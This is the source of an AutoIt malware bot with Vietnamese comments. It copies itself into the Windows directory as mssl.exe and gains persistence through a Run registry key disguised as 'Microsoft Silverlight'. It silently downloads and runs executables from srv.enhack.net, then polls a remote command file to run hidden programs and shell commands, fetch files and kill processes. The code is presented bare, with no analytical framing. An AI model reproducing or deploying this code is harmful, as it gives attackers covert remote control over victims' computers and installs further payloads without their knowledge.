#include 
#include 
#NoTrayIcon

; Cau hinh dieu khien
$txt = "http://srv.enhack.net/direc.txt"
$key = ""

; Han che 1 tien trinh
$list = ProcessList(@ScriptName)
For $i = 2 to $list[0][0]
 ProcessClose($list[$i][1])
Next

Update()
Backup()

; Ham cap nhat
Func Update()
 If @ScriptName = "mssl.exe" Then
  If InetGetSize("http://srv.enhack.net/Buzz.exe") <> FileGetSize(@WindowsDir & "\mssl.exe") Then
   Do
    InetGet("http://srv.enhack.net/Buzz.exe", @TempDir & "\Buzz.exe", 1)
   Until InetGetSize("http://srv.enhack.net/Buzz.exe") = FileGetSize(@TempDir & "\Buzz.exe")
   Run(@TempDir & "\Buzz.exe", "", @SW_HIDE)
  EndIf
 EndIf
EndFunc

; Kiem tra du phong
Func Backup()
 If Not FileExists(@WindowsDir & "\bkd.exe") Then
  Do
   InetGet("http://srv.enhack.net/bkd.exe", @WindowsDir & "\bkd.exe", 1)
  Until InetGetSize("http://srv.enhack.net/bkd.exe") = FileGetSize(@WindowsDir& "\bkd.exe")
 EndIf

 If Not ProcessExists("mssld.exe") Then
  Run("bkd", "", @SW_HIDE)
 EndIf
EndFunc
 
; Lay nhiem vao he thong
If @ScriptName <> "mssl.exe" Then
 If ProcessExists("mssl.exe") Then ProcessClose("mssl.exe")
 FileCopy (@ScriptFullPath, @WindowsDir & "\mssl.exe", 1)
 Run("mssl", "", @SW_HIDE)
Else
 $list = ProcessList("Buzz.exe")
 For $i = 1 to $list[0][0]
  ProcessClose($list[$i][1])
 Next
 If FileExists(@TempDir & "\Buzz.exe") Then FileDelete(@TempDir & "\Buzz.exe")
EndIf
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Microsoft Silverlight", "REG_SZ", @WindowsDir & "\mssl.exe")


; Chuong trinh chinh
While (1)
 $con = _INetGetSource($txt)
 If $key <> $con Then
 ; Phan tich va thuc hien lenh
  If StringInStr($con, "#", 2) Then
   $cmd = StringSplit($con, "#")
   If StringInStr($con, "@#", 2) Then
    Run($cmd[2], "", @SW_HIDE)
   Else
    Run($cmd[2])
   EndIf
  
  ElseIf StringInStr($con, ">", 2) Then
   $cmd = StringSplit($con, ">")
   _RunDOS($cmd[2])
  
  ElseIf StringInStr($con, "!", 2) Then
   $cmd = StringSplit($con, " ")
   InetGet ($cmd[2], $cmd[3], 1)
  
  ElseIf StringInStr($con, "~", 2) Then
   $cmd = StringSplit($con, "~")
   If StringInStr($cmd[2], ".exe", 2) Then
    $list = ProcessList($cmd[2])
   Else
    $list = ProcessList($cmd[2] & ".exe")
   EndIf 
   
   For $i = 1 to $list[0][0]
    ProcessClose($list[$i][1])
   Next
  
  ElseIf StringInStr($con, "^", 2) Then
   Update()
   
  ElseIf StringInStr($con, "$", 2) Then
   Backup()

  EndIf
  $key = $con
 EndIf
 Sleep(5000)
WEnd 

